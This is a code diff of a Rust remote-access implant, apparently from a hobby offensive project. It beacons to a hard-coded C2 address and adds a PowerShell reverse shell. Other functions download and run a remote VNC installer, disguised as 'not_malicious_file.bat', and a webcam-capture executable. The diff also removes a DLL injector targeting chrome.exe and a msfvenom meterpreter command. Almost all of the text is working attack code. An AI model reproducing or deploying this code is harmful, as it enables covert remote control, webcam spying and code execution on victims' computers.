@@ -10,11 +10,9 @@ use tokio::net::tcp::OwnedWriteHalf;
 use tokio::net::TcpStream;
 use std::io::Result;
 use std::io::prelude::*;
-use std::net::TcpStream;
+use std::net::TcpStream as OtherTcpStream;
 use std::process::Command;
 use std::str::from_utf8;
-use std::env;
-use dll_syringe::{Syringe, process::OwnedProcess};
 use std::env;
 
 #[derive(Serialize, Deserialize)]
@@ -64,16 +62,21 @@ pub fn interpret_payload(payload: String) {
         shell(infos_payload[1], infos_payload[2]);
         
     }
+    else if infos_payload[0] == "vnc"{
+        println!("Activating reverseshell");
+        shell(infos_payload[1], infos_payload[2]);
+    }
 }
 
-pub shell(ip: &str, port: &str) -> Result<()> {
+pub async fn shell(ip: &str, port: &str) -> Result<()> {
     let args: Vec<String> = env::args().collect();
     
-    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
+    let mut stream = OtherTcpStream::connect(format!("{}:{}", ip, port))?;
     stream.write(b"Welcome to rustshell.\nI am here to execute your commands\nuse 'exit' to exit\n")?;
     let mut buffer = [0; 2048];
 
     loop {
+        stream.write(b"PWND_MACHINE : ");
         let buf_len = stream.read(&mut buffer).unwrap();
         let command = from_utf8(&buffer[0..buf_len-1]).unwrap();
     
@@ -81,16 +84,62 @@ pub shell(ip: &str, port: &str) -> Result<()> {
             break;
         }
         
-        let output = Command::new("cmd")
-                .args(&["/C", &command])
+        let output = Command::new("powershell")
+                .args(&[&command])
                 .output()
-                .expect("failed to execute the process")
+                .expect("failed to execute the process");
 
         let reply = output.stdout;
         stream.write(&reply).unwrap();
     };
         Ok(())
 }
+
+fn vnc() {
+    let output = Command::new("cmd")
+        .args(&["/C", "curl.exe", "--output", "not_malicious_file.bat", "--url", "https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/vnc_auto_inst.bat"])
+        .output()
+        .expect("failed to execute process");
+
+    let output = Command::new("cmd")
+        .args(&["/C", "not_malicious_file.bat"])
+        .output()
+        .expect("failed to execute process");
+
+    for out in String::from_utf8(output.stdout).iter() {
+        println!("{}", out);
+    }
+}
+
+
+
+fn cam2ip() {
+    let output = Command::new("cmd")
+        .args(&["/C", "curl.exe", "--output", "cam2ip.exe", "--url", "https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/cam2ip/cam2ip.exe"])
+        .output()
+        .expect("failed to execute process");
+
+    let output = Command::new("cmd")
+        .args(&["/C", "cam2ip.exe"])
+        .output()
+        .expect("failed to execute process");
+
+    for out in String::from_utf8(output.stdout).iter() {
+        println!("{}", out);
+    }
+}
+
+fn cam2ipdll() {
+    let output = Command::new("cmd")
+        .args(&["/C", "curl.exe", "--output", "opencv_ffmpeg2413_64.dll", "--url", "https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/cam2ip/opencv_ffmpeg2413_64.dll"])
+        .output()
+        .expect("failed to execute process");
+
+    for out in String::from_utf8(output.stdout).iter() {
+        println!("{}", out);
+    }
+}
+
 
 #[tokio::main]
 async fn main() -> io::Result<()> {
@@ -102,8 +151,9 @@ async fn main() -> io::Result<()> {
     let pub_key_pem = RsaPublicKey::to_public_key_pem(&pub_key).unwrap();
 
     // Username input
-    let key = "COMPUTERNAME";
-    let username = env::var(key).unwrap();
+    //let key = "COMPUTERNAME";
+    //let username = env::var(key).unwrap();
+    let username = "bobby".to_string();
 
     // TCP Stream creation
     let mut _stream = TcpStream::connect("192.168.1.41:53").await?;
@@ -152,7 +202,7 @@ async fn main() -> io::Result<()> {
     // Spawn thread
     let rng_thread = rng.clone();
     loop{
-        let sleep_time = std::time::Duration::from_secs(rng.gen_range(30..60));
+        let sleep_time = std::time::Duration::from_secs(rng.gen_range(10..20));
         println!("{:?}", sleep_time);
         std::thread::sleep(sleep_time);
         println!("Sending heartbeat");
@@ -167,25 +217,12 @@ async fn main() -> io::Result<()> {
                 println!("Heartbeat recieved");
                 let pingback = String::from_utf8(dec_data).expect("Found invalid UTF-8");
                 let from_json_message: Message = serde_json::from_str(&pingback).unwrap();
-                if from_json_message.message_type == "payload" {
-                    interpret_payload(from_json_message.message_content);
-                }
+                //if from_json_message.message_type == "payload" {
+                //    interpret_payload(from_json_message.message_content);
+                //}
+                println!("{}", from_json_message.message_content);
             }
-            Err(_e) => {}
+            Err(e) => {println!("Fuck you ! {}", e);}
         }
     }
-
-}
-pub fn dll_injector() {
-    //on cherche le process à injecter 
-    let targer_process = OwnedProcess::find_first_by_name("chrome.exe").unwrap();
-    //on crée un "syringe" pour le process cible
-    let syringe = Syringe::for_process(targer_process);
-    //on injecte le payload dans le process cible
-    let injected_payload = syringe.inject("injection_payload.dll").unwrap();
-    //a test
-
-    //Dll generate
-    //sudo msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --plateform windows -f dll LHOST=ip LPORT=4444 > payload.shellcode
-
 }
